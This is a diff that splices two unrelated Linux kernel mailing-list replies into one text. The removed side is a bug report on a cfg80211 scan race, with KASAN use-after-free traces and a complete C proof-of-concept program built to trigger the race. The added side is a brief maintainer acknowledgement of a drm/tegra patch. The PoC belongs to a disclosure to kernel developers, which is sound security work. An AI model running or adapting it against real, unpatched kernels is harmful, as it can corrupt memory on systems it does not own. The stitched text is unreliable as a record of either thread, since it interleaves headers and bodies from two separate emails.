@@ -1,396 +1,105 @@
-Received: from out162-62-57-87.mail.qq.com (out162-62-57-87.mail.qq.com [162.62.57.87])
+Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6C0ED23643F;
-	Mon, 22 Jun 2026 05:25:46 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=162.62.57.87
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0B85E19E97B;
+	Mon, 22 Jun 2026 06:49:22 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1782105951; cv=none; b=cu0NhBDrhhEl8btu35IAhFiUwoHrQ4M6BAW4Hjt3j/wTQb5WAfrVT7ij2vjAf0RH5y6LegPe8ocqU6w7MjKUsqy8z4j2sB8kCzsHlW66/XZI4troeGWC2KMpGOKOueeVnND8fNLuQ68O54NjAz8ACH1JnP3z3T3VHFlufXQmcJ0=
+	t=1782110963; cv=none; b=Q5njV2qUXaHMBkdIJ1+271sQBG+3HDrRUjAwR3Yw/nmB3Pn8Us/GERHQZ7v4S9eLtl7BmQqAjQQ7fraAw4Jfxd67GVGWVxl0K/SGnj/ekY23aneSNTHloCEs4hMEZJsKxq1rThXXclsIV0TSmSLgI2SjGKGIWwP6HluuB+esmAo=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1782105951; c=relaxed/simple;
-	bh=el2GQXROO36seMfkn2JddLNe/vDTgFcGQdMTAJ7cvlE=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=ftsXLR0ZAsghlwpsfQ4IFawU4YgyfvN6CLDYLgPti9x5OAWbMvBlzBFX5Gg4XgZl132l8Fw2iuCjVLlYatFbLKTWcdDXhyrbMFK1EpTraJDOy+KT2uMRbuQJ9ZVYn4Zxp7iPDDG6HqjkF4GIadDYicmiZrr+DL/z2KEuDVfvB1M=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=DSdGR+a/; arc=none smtp.client-ip=162.62.57.87
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
+	s=arc-20240116; t=1782110963; c=relaxed/simple;
+	bh=yeRUmbpvJQWfjBH1tASyBUioJFt0u45l2lijhn1ZYPo=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=ZmAyaRLe6h4J9ee74qewaUP+CkFNKqiSmW4joozCO274sOSFY2HUlI8KqzAmUQchFzalFzbDn/pPoG/lJfm3GMWPekY9LeJmF1q/MENO2sP/BJkZg3aMrYxA+EYYAuTlvO6GHqKeHs56CYOOwCjEv77lng6AtYncWBnmUau5x5g=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=jqC65v2k; arc=none smtp.client-ip=100.103.45.18
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="DSdGR+a/"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
-	t=1782105937; bh=/gACr6QXTcIUN+QLMdKk6UQjO38cTXwX+zZXngkjW4w=;
-	h=Date:Subject:To:Cc:References:From:In-Reply-To;
-	b=DSdGR+a/65cKXzn3sLhO6ED9a4VcnG0lJUFGdByzDXw2grzDZa3C/NTbRKpQrCWqj
-	 hQlO1En1dXxyy3wCwe66NyeO4CFCmwBYC2CCV61QgLZVbMj37lVwBoT2pOwxDmXpMr
-	 gfP7GMW22a/FCnAXrArNI1uTEdiTKycJmhgErZBc=
-Received: from [192.168.3.157] ([115.156.144.140])
-	by newxmesmtplogicsvrsza63-0.qq.com (NewEsmtp) with SMTP
-	id 662B8EC5; Mon, 22 Jun 2026 13:25:34 +0800
-X-QQ-mid: xmsmtpt1782105934tbphiyrx1
-Message-ID: <tencent_D39C654EBCC3C95DC8C48841701D8D5D2808@qq.com>
-X-QQ-XMAILINFO: M8SslFiB5g9IuUNKg4cPDz9nyCtj3uc95HlyuyB2MbVC2aYvOTbszrxWW4ldq2
-	 ARG+XViuONMk1Qlc10iDqM5BpOnAA5sNXRsEPMjFDfg0sKZZx30ME5/v7LggmisnhrH4Cf7Zo2it
-	 kIRcCHeOYqFm47vzUOE7/4s1RAoL/R1VqQxYoYSpEl8o0n99ML7PUwVowKcBSzLVJnX9RYpU67+9
-	 I1ROOk9cEO2VQLkEmoyWsJkQj775nCQTrzLAHiqILAl6QqLI3VompipVZNMvoGkJWmPPr/n6s6Fh
-	 HI8jLQBytnZjHjJsEJLhjZ00Df0k2GaiVS0zjrepZig4gUEmGTpndSVY5IGfOYXyjw1gnRLKN8Nd
-	 aG6c4LI8NM+oNkMGUIArSYnDW6m6igGTgSxuMphetjIlHlyyACE7KoZlfza6yovHrzxKcjwHw7x6
-	 eGO7QEDY1rILHuFwV9nHxn2F3JtC8lPrprEslKoqAUnLtZqMInbpC41A80oFM0DP2YnRfTiXf4ha
-	 jfKkMjm5cwa1Saf/eMj8K1nCwYsrRQ1tVhCOpu5rDL63oSyMkHgW62J7Bs9QbqxHq9w9Wv8/iALZ
-	 Xt3m+2N1jHQwFkezsgR5JH9T7y4XwTnPcVXTBStYFNdEHmoLJtxiN2rtPthxtfYVxgNxI+CFztX5
-	 h029nvCZoBJbgt25bqjYvtjh9CoDG7KulwmcfGjAWoIx2T3OFgYfjvzBNmGNlxezwML2Yev5q+nw
-	 ktIzxt58PoLu8HZNtg9657R+fa129q9ZHRE83bBaV8+kFP3kaA/3DaOua34rhbtxw1XewCn8gair
-	 3WP0p/N/qqnkY9FwZG3VyJYaHDGHP4Az09BTzutTXkSFN4wcBMVz2wqFyz9Nx3JGnbj6Qu3+JtkM
-	 +Ux+6B+CJANerCUbU53/9Fq47VdJ7HW3tMTbZHiJpUubvshwPp1jIFgFCuIKgakt+VrBfi/WpqJu
-	 0rbU0Z1tvsIJ8T/luKyzN6HxirNPqU0lRZ+qvYWXez0ZiypG1z2jQPi/W6kBOxZ7Kh8xS0BMpX//
-	 otXgcmyhUIH/u1RzxVIYnkfa+bJqLoATXP1uqdlAUNYb1jzGfCy7vpWKeXn1VB2T5Kg0X8qqn1mI
-	 er8fnrmiBfG7R8dVpV9DuqjhUjyQ==
-X-QQ-XMRINFO: M/715EihBoGS47X28/vv4NpnfpeBLnr4Qg==
-X-OQ-MSGID: <1852d8ff-c32d-4c34-833e-3d9b771228e9@qq.com>
-Date: Mon, 22 Jun 2026 13:25:34 +0800
+	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="jqC65v2k"
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 140481F000E9;
+	Mon, 22 Jun 2026 06:49:21 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
+	s=k20260515; t=1782110962;
+	bh=YZQ8yptCt1lq6NlPILbwAJXHuZqPr53lP1nmexhIeps=;
+	h=Date:From:To:Cc:Subject:References:In-Reply-To;
+	b=jqC65v2kSfalprkM/QEu6WCz9T+4cKA3S4sf9oWnxV6jK3M6yhMiSWeonmqxyX5aC
+	 VCCxu84+0XOFIYqBo9NYYy34s5wUNlStPNjWx1rJSBNmCodAdjFB/euzaobvxXi8f8
+	 6KrXIjRP3Adm3PDrG6/CKZGYR4+bZMfack/gI3TxkYn6pHmUKBOR5YwNFMBwF1Nz7d
+	 vpjyNFM/unx/6MXPdM9hzpvz1MiyLaJerVI5gLtvuRRjA1FK0I4S9aDqqEydH4nRMz
+	 S8B3fcIC0qk2+UoNZq2pEwYFNXzMsQHRHRo9Mchf5ZLHCDroDkr/prkD3R1b+z1Mnn
+	 yeo6TeCl6J04Q==
+Date: Mon, 22 Jun 2026 08:49:19 +0200
+From: Thierry Reding <thierry.reding@kernel.org>
+To: Christophe JAILLET <christophe.jaillet@wanadoo.fr>
+Cc: Mikko Perttunen <mperttunen@nvidia.com>, 
+	David Airlie <airlied@gmail.com>, Simona Vetter <simona@ffwll.ch>, 
+	Jonathan Hunter <jonathanh@nvidia.com>, linux-kernel@vger.kernel.org, kernel-janitors@vger.kernel.org, 
+	dri-devel@lists.freedesktop.org, linux-tegra@vger.kernel.org
+Subject: Re: [PATCH] drm/tegra: Fix a strange error handling path
+Message-ID: <ajjaW_fGdHWPZr9K@orome>
+References: <308ea09281bd0b3fb0ec7e90e23012c0783f373c.1781983379.git.christophe.jaillet@wanadoo.fr>
 Precedence: bulk
 X-Mailing-List: kernel-janitors@vger.kernel.org
 List-Id: <kernel-janitors.vger.kernel.org>
 List-Subscribe: <mailto:kernel-janitors+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:kernel-janitors+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH] wifi: cfg80211: Fix an error handling path in
- cfg80211_wext_siwscan()
-To: Christophe JAILLET <christophe.jaillet@wanadoo.fr>,
- Johannes Berg <johannes@sipsolutions.net>,
- "John W. Linville" <linville@tuxdriver.com>
-Cc: linux-kernel@vger.kernel.org, kernel-janitors@vger.kernel.org,
- linux-wireless@vger.kernel.org
-References: <a1be7eea4da0da18f90589af252bb76a18a61978.1781984889.git.christophe.jaillet@wanadoo.fr>
-From: XIAO WU <xiaowu.417@qq.com>
-In-Reply-To: <a1be7eea4da0da18f90589af252bb76a18a61978.1781984889.git.christophe.jaillet@wanadoo.fr>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
+Content-Type: multipart/signed; micalg=pgp-sha512;
+	protocol="application/pgp-signature"; boundary="bwk7zbxn2pnhgwkg"
+Content-Disposition: inline
+In-Reply-To: <308ea09281bd0b3fb0ec7e90e23012c0783f373c.1781983379.git.christophe.jaillet@wanadoo.fr>
 
-Hi Christophe,
 
-Thanks for this fix — the memory leak on the essid_len check failure
-path is clearly a bug.
+--bwk7zbxn2pnhgwkg
+Content-Type: text/plain; protected-headers=v1; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+Subject: Re: [PATCH] drm/tegra: Fix a strange error handling path
+MIME-Version: 1.0
 
-I came across an automated AI code review of this function on the Sashiko
-platform[1] that identified a pre-existing race condition in this code
-path, and I was able to independently verify it triggers a real
-KASAN-detected use-after-free by testing with the mac80211_hwsim driver
-in QEMU.
+On Sat, Jun 20, 2026 at 09:23:14PM +0200, Christophe JAILLET wrote:
+> The resource freed at the 'put_aux' label is "sor->aux->dev".
+> However, this resource is taken after devm_tegra_pmc_get(), so there is no
+> point to release it in this error handling path.
+>=20
+> This is harmless because put_device() will be called with a NULL pointer,
+> but this is confusing.
+>=20
+> So, fix the logic and return directly.
+>=20
+> Signed-off-by: Christophe JAILLET <christophe.jaillet@wanadoo.fr>
+> ---
+> Compile tested only.
+>=20
+> This is not a bug, so no need for a Fixes tag.
+> If needed anyway, it was introduced by commit e68c4244136b ("drm/tegra:
+> Explicitly specify PMC instance to use")
+> ---
+>  drivers/gpu/drm/tegra/sor.c | 6 ++----
+>  1 file changed, 2 insertions(+), 4 deletions(-)
 
-TL;DR: The lockless `rdev->scan_req` check in
-cfg80211_wext_siwscan() races with nl80211_trigger_scan().  I was able
-to trigger a KASAN slab-use-after-free in ieee80211_scan_work via a
-barrier-synchronized two-thread race between SIOCSIWSCAN and
-NL80211_CMD_TRIGGER_SCAN.
+Good catch! Looks like I used the put_aux label without realizing that
+sor->aux isn't acquired until *after* sor->pmc here.
 
-(This is a pre-existing issue, not introduced by your patch — your fix
-is still correct.)
+Thanks for fixing this,
+Thierry
 
- > diff --git a/net/wireless/scan.c b/net/wireless/scan.c
- > @@ -3612,8 +3612,10 @@ int cfg80211_wext_siwscan(struct net_device *dev,
- >      /* translate "Scan for SSID" request */
- >      if (wreq) {
- >          if (wrqu->data.flags & IW_SCAN_THIS_ESSID) {
- > -            if (wreq->essid_len > IEEE80211_MAX_SSID_LEN)
- > -                return -EINVAL;
- > +            if (wreq->essid_len > IEEE80211_MAX_SSID_LEN) {
- > +                err = -EINVAL;
- > +                goto out;
- > +            }
+--bwk7zbxn2pnhgwkg
+Content-Type: application/pgp-signature; name="signature.asc"
 
-This fix is correct — the old code leaked `creq`.  However, earlier in
-the same function (around line 3530):
+-----BEGIN PGP SIGNATURE-----
 
-     if (rdev->scan_req || rdev->scan_msg)
-         return -EBUSY;
+iQIzBAABCgAdFiEEiOrDCAFJzPfAjcif3SOs138+s6EFAmo42usACgkQ3SOs138+
+s6GSbA//VUr9ah6aJm5qD5DKf1B6cLsg2AIC61cAOTFggrPwRm11eLgTNgtdv0rd
+UZz2PFAt1YzKNlA/vIM1W1Z1Zjf3r2uXnBMgFmS1CbIVf6zPt0webV1kIUhtrPNf
+Ln/WoJGJocjvAujFvOXKzFL7OE8R8TBKuGCUAHr96+XIfAABlBuuk4X8sxoiO0WD
+DW8RNYP+e2UaxOZhJcJt4jVaalfLMS2o6KdOP37cSECDIVoCMUXQNqM7Hx7kcN7+
+RQq9mvRe4E5zJiP7cOkCwQgjRocFbBbuqkFYcTKhKmvYshZb4hKwjtIyQ2SrVbc5
+H0TWlYGEX9jQAApPn96Xm90nieYPXSaz3+vYwN+PjTACQMLPoJvd54K9JpshtyAs
+wX4zIRkheTc5eFjv4lNUDsJYw47ivzEnIj3+DTRsmK8JDwY8XZw3Wdrow5c7HLNT
+JvH6HSfUG+mf6AMeb5fp53ztJyRKHwd4g+iDzAR6kxRf+NDL5ZhX6tAhRCN2Vv7w
+sVMKvoC67uReGFQXvLiONTYtl1IyDSaXyDn+xwEl4XR3juudFwW7LOiwEvySHeye
+BVvFPauNP8QAYKwp6CsCituDXHHsscG1U9SRTh/rEJcxyiagTDJ+DTf4Pr95UxrZ
+AbDVQDrueHk3MZntlVFRagAu1XEeLUb8AeB5GCfLKB7z0xbUlrc=
+=kXhu
+-----END PGP SIGNATURE-----
 
-This check is done WITHOUT holding the wiphy mutex.  Meanwhile,
-nl80211_trigger_scan() acquires the wiphy via `pre_doit` before setting
-`rdev->scan_req`.  The race is:
-
-    Thread A (wext)          |   Thread B (nl80211)
-                             |
-    check rdev->scan_req     |   (wiphy lock acquired by pre_doit)
-    → NULL, proceeds         |   check rdev->scan_req → NULL
-                             |   set rdev->scan_req = req_B
-                             |   rdev_scan(rdev, req_B)
-    acquire wiphy lock        |
-    rdev->scan_req = req_A    |   ← req_B pointer LOST, overwritten
-    rdev_scan(rdev, req_A)   |
-
-When the scan completes, `cfg80211_scan_done()` detects the mismatch:
-
-```
-WARNING: net/wireless/scan.c:1199: intreq != rdev->scan_req
-          && intreq != rdev->int_scan_req
-```
-
-I was able to reproduce this reliably using mac80211_hwsim with a
-barrier-synchronized two-thread PoC.  The kernel was 7.1.0 with
-CONFIG_KASAN=y, CONFIG_CFG80211_WEXT=y, CONFIG_MAC80211_HWSIM=y.
-
-The WARN_ON from cfg80211_scan_done():
-```
-[  619.100917][   T27] ------------[ cut here ]------------
-[  619.101461][   T27] intreq != rdev->scan_req && intreq != 
-rdev->int_scan_req
-[  619.101465][   T27] WARNING: net/wireless/scan.c:1199 at 
-cfg80211_scan_done+0x19e/0x530
-[  619.114641][   T27] Call Trace:
-[  619.115207][   T27]  ? __pfx_cfg80211_scan_done+0x10/0x10
-[  619.116536][   T27]  __ieee80211_scan_completed+0x34c/0xe50
-[  619.117049][   T27]  ieee80211_scan_work+0x3f6/0x2090
-[  619.119819][   T27]  cfg80211_wiphy_work+0x2c3/0x550
-[  619.121271][   T27]  process_one_work+0xa0b/0x1c50
-[  619.122261][   T27]  worker_thread+0x6df/0xf30
-```
-
-Followed by a KASAN slab-use-after-free in ieee80211_scan_work:
-```
-[  614.882691][ T1114] BUG: KASAN: slab-use-after-free in 
-ieee80211_scan_work+0x1db4/0x2090
-[  614.883408][ T1114] Read of size 4 at addr ffff88811a135024 by task 
-kworker/u10:4/1114
-
-[  614.900665][ T1114] Allocated by task 9513:
-[  614.901042][ T1114]  kasan_save_stack+0x33/0x60
-[  614.902284][ T1114]  __kmalloc_noprof+0x31e/0x7f0
-[  614.902719][ T1114]  nl80211_trigger_scan+0x4e3/0x1fb0
-[  614.903701][ T1114]  genl_rcv_msg+0x561/0x800
-
-[  614.907688][ T1114] Freed by task 1114:
-[  614.908036][ T1114]  kasan_save_stack+0x33/0x60
-[  614.909741][ T1114]  kfree+0x165/0x710
-[  614.910085][ T1114]  ___cfg80211_scan_done+0x44b/0x9a0
-
-[  614.913247][ T1114] The buggy address is located 36 bytes inside of
-[  614.913247][ T1114]  freed 2048-byte region [ffff88811a135000, 
-ffff88811a135800)
-```
-
-The PoC uses pthread barrier synchronization to force both paths through
-the lockless check simultaneously.  It runs on wlan0 created by
-mac80211_hwsim (modprobe mac80211_hwsim radios=2).
-
-Full PoC (compile with:  gcc -Wall -o poc poc.c -lpthread):
-```c
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <errno.h>
-#include <pthread.h>
-#include <sched.h>
-#include <signal.h>
-#include <sys/ioctl.h>
-#include <sys/socket.h>
-#include <net/if.h>
-#include <linux/if.h>
-#include <linux/netlink.h>
-#include <linux/genetlink.h>
-#include <linux/nl80211.h>
-#include <linux/wireless.h>
-
-static char ifname[IFNAMSIZ] = "wlan0";
-static int nl80211_fid = -1;
-static int nl_sock = -1;
-static volatile int stop = 0;
-static int wext_ok, nl_ok;
-static pthread_barrier_t barrier_go;
-
-static int resolve_nl80211(void)
-{
-     char buf[4096];
-     struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
-     struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-     struct genlmsghdr *genlh;
-     struct nlattr *attr;
-     int ret;
-
-     memset(buf, 0, sizeof(buf));
-     nlh->nlmsg_len = NLMSG_HDRLEN + GENL_HDRLEN +
-                      NLA_HDRLEN + sizeof(NL80211_GENL_NAME);
-     nlh->nlmsg_type = GENL_ID_CTRL;
-     nlh->nlmsg_flags = NLM_F_REQUEST;
-     nlh->nlmsg_seq = 1;
-     genlh = (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
-     genlh->cmd = CTRL_CMD_GETFAMILY;
-     genlh->version = 1;
-     attr = (struct nlattr *)(buf + NLMSG_HDRLEN + GENL_HDRLEN);
-     attr->nla_type = CTRL_ATTR_FAMILY_NAME;
-     attr->nla_len = NLA_HDRLEN + sizeof(NL80211_GENL_NAME);
-     memcpy((char *)attr + NLA_HDRLEN, NL80211_GENL_NAME,
-            sizeof(NL80211_GENL_NAME));
-     ret = sendto(nl_sock, buf, nlh->nlmsg_len, 0,
-              (struct sockaddr *)&sa, sizeof(sa));
-     if (ret < 0) return -1;
-     ret = recv(nl_sock, buf, sizeof(buf), 0);
-     if (ret < 0) return -1;
-     nlh = (struct nlmsghdr *)buf;
-     if (!NLMSG_OK(nlh, (unsigned int)ret)) return -1;
-     genlh = (struct genlmsghdr *)NLMSG_DATA(nlh);
-     char *data = (char *)NLMSG_DATA(nlh) + GENL_HDRLEN;
-     int left = ret - (data - (char *)nlh);
-     while (left >= (int)sizeof(struct nlattr)) {
-         attr = (struct nlattr *)data;
-         int al = NLA_ALIGN(attr->nla_len);
-         if (al > left || al < (int)sizeof(struct nlattr)) break;
-         if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
-             nl80211_fid = *(uint16_t *)((char *)attr + NLA_HDRLEN);
-             return 0;
-         }
-         data += al; left -= al;
-     }
-     return -1;
-}
-
-/* Send NL80211_CMD_TRIGGER_SCAN via generic netlink */
-static int send_nlscan(void)
-{
-     char buf[512];
-     struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
-     int ifindex = if_nametoindex(ifname);
-     if (ifindex <= 0) return -1;
-
-     struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
-     struct genlmsghdr *genlh;
-     struct nlattr *attr;
-
-     memset(buf, 0, sizeof(buf));
-     nlh->nlmsg_type = nl80211_fid;
-     nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
-     nlh->nlmsg_seq = 1;
-     genlh = (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
-     genlh->cmd = NL80211_CMD_TRIGGER_SCAN;
-     genlh->version = 1;
-
-     char *ptr = buf + NLMSG_HDRLEN + GENL_HDRLEN;
-     attr = (struct nlattr *)ptr;
-     attr->nla_type = NL80211_ATTR_IFINDEX;
-     attr->nla_len = NLA_HDRLEN + 4;
-     *(int *)(ptr + NLA_HDRLEN) = ifindex;
-     ptr += NLA_ALIGN(attr->nla_len);
-
-     nlh->nlmsg_len = ptr - buf;
-     return sendto(nl_sock, buf, nlh->nlmsg_len, 0,
-               (struct sockaddr *)&sa, sizeof(sa));
-}
-
-/* nl80211 thread: waits for barrier, fires scan request */
-static void *nl_thread(void *arg)
-{
-     (void)arg;
-     cpu_set_t cpus; CPU_ZERO(&cpus); CPU_SET(1, &cpus);
-     sched_setaffinity(0, sizeof(cpus), &cpus);
-     while (!stop) {
-         pthread_barrier_wait(&barrier_go);
-         if (stop) break;
-         /*
-          * nl80211_trigger_scan() holds wiphy via pre_doit.
-          * rdev->scan_req check at line ~11115 — lockless with
-          * respect to the wext path.
-          */
-         if (send_nlscan() == 0)
-             __sync_fetch_and_add(&nl_ok, 1);
-         /* drain the ACK */
-         char buf[4096];
-         struct timeval tv = { .tv_sec = 5 };
-         setsockopt(nl_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-         recv(nl_sock, buf, sizeof(buf), 0);
-     }
-     return NULL;
-}
-
-int main(void)
-{
-     pthread_t nt;
-     struct sockaddr_nl sa;
-
-     setbuf(stdout, NULL);
-     signal(SIGPIPE, SIG_IGN);
-
-     printf("PoC: wext vs nl80211 scan race (barrier sync)\n\n");
-
-     /* bring wlan0 up */
-     int s = socket(AF_INET, SOCK_DGRAM, 0);
-     struct ifreq ifr;
-     memset(&ifr, 0, sizeof(ifr));
-     strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
-     ioctl(s, SIOCGIFFLAGS, &ifr);
-     ifr.ifr_flags |= IFF_UP;
-     ioctl(s, SIOCSIFFLAGS, &ifr);
-     close(s);
-
-     /* set up generic netlink for nl80211 */
-     nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
-     memset(&sa, 0, sizeof(sa));
-     sa.nl_family = AF_NETLINK;
-     bind(nl_sock, (struct sockaddr *)&sa, sizeof(sa));
-     if (resolve_nl80211() < 0) {
-         fprintf(stderr, "nl80211 resolve failed\n");
-         return 1;
-     }
-     printf("nl80211 family: %d\n", nl80211_fid);
-
-     pthread_barrier_init(&barrier_go, NULL, 2);
-     pthread_create(&nt, NULL, nl_thread, NULL);
-
-     cpu_set_t cpus; CPU_ZERO(&cpus); CPU_SET(0, &cpus);
-     sched_setaffinity(0, sizeof(cpus), &cpus);
-
-     for (int i = 0; i < 20000; i++) {
-         /*
-          * Barrier: fire both paths simultaneously.
-          *
-          * wext: checks rdev->scan_req at scan.c:~3530
-          *       WITHOUT wiphy lock → lockless relative to nl80211.
-          * nl:   holds wiphy from pre_doit.
-          */
-         pthread_barrier_wait(&barrier_go);
-
-         /* wext path: SIOCSIWSCAN with IW_SCAN_THIS_ESSID */
-         int fd = socket(AF_INET, SOCK_DGRAM, 0);
-         if (fd >= 0) {
-             struct iwreq wrq;
-             struct iw_scan_req sr;
-             memset(&wrq, 0, sizeof(wrq));
-             memset(&sr, 0, sizeof(sr));
-             strncpy(wrq.ifr_name, ifname, IFNAMSIZ - 1);
-             sr.essid_len = 5;
-             memcpy(sr.essid, "test", 5);
-             wrq.u.data.flags = IW_SCAN_THIS_ESSID;
-             wrq.u.data.length = sizeof(sr);
-             wrq.u.data.pointer = (caddr_t)&sr;
-             if (ioctl(fd, SIOCSIWSCAN, &wrq) == 0)
-                 wext_ok++;
-             close(fd);
-         }
-         if (i % 2000 == 1999)
-             printf("[%d] wext=%d nl=%d\n", i + 1, wext_ok, nl_ok);
-     }
-
-     stop = 1;
-     pthread_barrier_wait(&barrier_go);
-     pthread_join(nt, NULL);
-
-     printf("\nFinal: wext=%d nl=%d\n", wext_ok, nl_ok);
-     if (wext_ok > 0 && nl_ok > 0) {
-         printf("RACE HIT! Both scan paths succeeded.\n"
-                "Run: dmesg | grep -E 'WARNING|KASAN|cfg80211_scan'\n");
-         fflush(stdout);
-         sleep(3);
-         system("dmesg | grep -iE 'WARNING|KASAN|cfg80211_scan' | tail 
--20");
-     }
-     close(nl_sock);
-     return 0;
-}
-```
-
-[1] 
-https://sashiko.dev/#/patchset/a1be7eea4da0da18f90589af252bb76a18a61978.1781984889.git.christophe.jaillet%40wanadoo.fr
-
-Thanks,
-Xiao
-
+--bwk7zbxn2pnhgwkg--
